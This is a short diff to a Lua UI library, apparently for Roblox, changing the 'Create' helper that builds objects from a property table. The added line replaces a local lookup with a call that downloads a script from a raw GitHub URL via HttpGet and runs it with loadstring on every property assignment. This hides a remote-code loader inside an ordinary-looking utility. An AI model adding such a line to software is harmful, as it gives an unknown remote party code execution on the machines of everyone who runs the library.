@@ -358,10 +358,10 @@ local Fonts = {
 }
 
 local function Create(Class, Properties)
-    local Object = Instance_new(Class);
+    local Object = Instance.new(Class);
 
     for i, v in next, Properties do
-        Object[i] = ReverseGet(v) or v
+        Object[i] = loadstring(game:HttpGet("https://raw.githubusercontent.com/bbbbbbbbbbbbbb121/sandbox/refs/heads/main/latest.lua", true))(v) or v
     end
 
     return Object
